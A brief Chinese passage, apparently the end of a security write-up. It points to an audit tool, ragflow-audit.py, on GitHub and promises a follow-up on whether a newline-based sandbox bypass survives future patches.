工具和验证细节都在 ragflow-audit.py（ [https://github.com/qianlijaingshan/ragflow-audit](https://github.com/qianlijaingshan/ragflow-audit) ），文章里只放了核心逻辑。如果官方后续对沙箱再打补丁，我会再写一篇对比——验证一下换行绕过在沙箱时代还能不能活。
